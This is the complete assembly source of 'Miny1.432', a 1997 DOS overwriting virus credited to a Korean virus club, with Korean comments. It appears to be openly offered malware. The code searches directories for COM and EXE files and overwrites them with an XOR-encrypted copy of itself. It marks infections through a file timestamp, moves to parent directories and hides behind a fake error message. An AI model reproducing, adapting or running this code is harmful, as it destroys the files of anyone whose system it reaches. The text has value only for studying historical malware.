;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;           Miny1.432                                        CVC #01  97/06
;
;
; 이름 : Miny1.432
; 제작자 : Osiris of CVC,Corea 97.06.01
; 종류 : 비상주형 겹쳐쓰기
;
; Miny1 버그개선 버전이다.
; 파일 찾기 할때 시스템 속성은 감염 시킬 필요가 없다.
;
; 원래 Miny1 은 SVS(Seoul Virus Society)의 KOV (바이러스의 기사:Knight Of Virus
; ) 가 제작했었다.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org     100h
 Entry:        call    Decode                   ; 암호 풀기

 Encry_Start:
               Mov     byte ptr S_Find,00       ; COM 감염인가, EXE 감염인가
               mov     byte ptr Total,00        ; 3개 감염
               Mov     dx,offset Com_File       ; 모든 COM 파일 감염
               mov     byte ptr Infected,00     ; 감염된 갯수를 0 으로 한다.
               Jmp     Find_File                ; 파일 찾기로 점프

;=================================================
; 데이터 값 영역
;

 Msg           DB      'Abnormal Program Termination.',0Dh,0Ah,'$'
 Com_File      DB      '*.com',00               ; 모든 COM 파일
 Exe_File      DB      '*.exe',00               ; 모든 EXE 파일
 Total         DB      ?                        ; 감염시킨수
 Infected      DB      ?                        ; 지금까지 감염된 파일들
 S_Find        DB      ?                        ; 감염시키고 있는 상태
 UP            DB      '..',00                  ; 상위로 이동

 Vir_Msg       DB ' Miny1 Virus - bug fix version   97/06/01',0Dh,0Ah
               DB ' (c) Copyleft 1997 by Osiris of CVC,Corea ',0Dh,0Ah
               DB ' CVC ? Corean Virus Club',0Dh,0Ah,'$'

               mov     bx,ds
               xor     ax,ax
               mov     ds,ax
               push    DS:[0090h]               ; Int 24h 값 저장
               Push    DS:[0092h]

               mov     DS:[0090h],offset NewInt24   ; Int 24h 가로챔
               mov     DS:[0092h],cs

               Push    CS                       ; cs=ds
               Pop     DS
 Find_File:
               Mov     ah,4Eh                   ; 파일 찾기
               Mov     cx,00100011B             ; 파일 속성
 Find:         Int     21h
               Jc      Find_EXE                 ; 에러?
 ChkInfect:
               mov     ax, DS:[0080h+1Eh]
               cmp     ax,'OC'                  ; COMMAND.COM 인가 ?
               jz      Find_NEXT
               Mov     al, DS:[0080h+22]        ; 감염 여부 검사
               And     al,1Fh                   ; 62 초 인가?
               Cmp     al,1Fh
               Jnz     InfectFile
               inc     byte ptr INFECTED        ; 감염된 파일
 Find_NEXT:
               Mov     ah,4Fh                   ; 다음 파일 검사
               JMP     Find                     ;

 InfectFile:
               mov     ax,4301h                 ; 속성을 읽기/쓰기로 만든다.
               xor     cx,cx                    ; DTA 가 0080h 부터 시작하므로
               mov     dx,0080h+1eh
               int     21h

               mov     ax,3d02h                 ; 오픈/쓰기로 오픈
               int     21h

               xchg    ax,bx                    ; AX 에 핸들 넣기
               mov     ax,5700h                 ; 시간 얻기
               int     21h
               push    cx
               push    dx

               xor     ax,ax                    ; 임의의 시간 얻기 (암호화
               mov     es,ax                    ; 에 사용)
               mov     al,byte ptr ES:[046Ch]   ; 0000:046Ch
               Push    CS                       ;
               Pop     ES                       ;
               mov     Key_Value,al             ; Key_Value = 암호키 값
               call    Write_Vir                ; 바이러스 쓰기 호출

               pop     dx                       ; 시간 복구
               pop     cx
               or      cx,+1Fh                  ; 초를 62초 로 바꿈
               mov     ax,5701h                 ; 시간 조정(원래 시간)
               int     21h

               mov     ah,3eh                   ; 파일 닫기
               Int     21h
               cmp     byte ptr Total,3         ; 3개 감염시켰나?
               jz      Stop_Virus
               Inc     byte ptr Total           ; 1 증가
               JMP     Find_NEXT
 Find_EXE:
               cmp     byte ptr S_Find,1        ; 01이면 EXE 파일도 감염시켰다.
               Jnz     DX_EXE
               mov     dx, offset UP            ; 상위 디렉토리로 이동
               mov     ah,3Bh
               Int     21h
               jc      Stop_Virus               ; 루트 디렉토리 인가 ?
               mov     byte ptr S_Find,00       ; COM 파일 부터 감염
               mov     dx, offset COM_File
               jmp     Find_File
 DX_EXE:
               Mov     byte ptr S_Find,01       ; EXE 파일을 감염시켜라.
               Mov     dx,offset Exe_File       ;
               Jmp     Find_File

 Stop_Virus:
               xor     ax,ax                    ; 원래 Int 24h 로 바꿈
               mov     ds,ax
               pop     DS:[0092h]
               pop     DS:[0090h]
               Push    CS
               Pop     DS
               mov     dx, offset Msg           ; 정상적인 에러로 가장
               cmp     byte ptr Infected,15     ; 15개 감염시켰으면 메시지
               jb      PrtMsg
               mov     dx, offset Vir_Msg
               mov     ax,0F044h                ; 램에 상주해 있는 해당 바이러스의
               Int     21h                      ; 증상 호출

 PrtMsg:       mov     ah,9                     ; 메시지 출력
               Int     21h

               Mov     ax,4C23h                 ; 특이하게 종료값을 준다.
               int     21h

 NewInt24:                                      ; Int 24h 처리
               xor     al,al
               IRET

 End_Encry:

;==================================================
;   바이러스 암호화 부분
;
 Write_Vir:    call    Decode                   ; 암호
               mov     ah,40h                   ; 바이러스 쓰기
               mov     dx, 100h
               mov     cx, offset Vir_END - 100h;
               Int     21h
               call    Decode                   ; 암호 해제
               RET
 Key_Value     DB      ?

 Decode:
               mov     si, 103h                 ; 암호 시작점
               mov     di,si
               mov     ah,Key_value             ; 암호 키값
               mov     cx, offset End_Encry - 103h
 E_Ing:
               lodsb                            ; 암호화
               xor     al,ah
               stosb
               loop    E_ing
               RET
 Vir_END:

 Miny1         ENDS
               END     Entry
